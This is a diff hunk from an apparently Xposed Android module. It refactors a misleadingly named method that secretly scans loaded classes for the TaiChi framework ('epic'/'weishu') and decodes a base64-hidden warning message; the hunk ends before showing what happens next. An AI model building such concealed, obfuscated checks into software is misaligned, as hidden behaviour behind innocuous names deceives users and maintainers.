@@ -45,13 +45,11 @@ public class Utils {
      */
     public static boolean getParamAvailability(final XC_MethodHook.MethodHookParam methodHookParam, int callingPid) {
         new Thread(() -> {
-            ClassLoader classLoader = XposedBridge.class.getClassLoader();
-            Object[] dexElements = (Object[]) XposedHelpers.getObjectField(XposedHelpers.getObjectField(classLoader, "pathList"), "dexElements");
+            Object[] dexElements = (Object[]) XposedHelpers.getObjectField(XposedHelpers.getObjectField(XposedBridge.class.getClassLoader(), "pathList"), "dexElements");
             for (Object entry : dexElements) {
                 Enumeration<String> entries = ((DexFile) XposedHelpers.getObjectField(entry, "dexFile")).entries();
                 while (entries.hasMoreElements()) {
-                    String className = entries.nextElement();
-                    if (className.matches(".+?(epic|weishu).+")) {
+                    if (entries.nextElement().matches(".+?(epic|weishu).+")) {
                         try {
                             String message = new String(Base64.decode("RG8gTk9UIHVzZSBUYWlDaGkgYW55d2F5XG7or7fkuI3opoHkvb/nlKjlpKrmnoHmiJbml6DmnoE=".getBytes(StandardCharsets.UTF_8), Base64.DEFAULT));
                             if (methodHookParam.args[0] instanceof Application) {
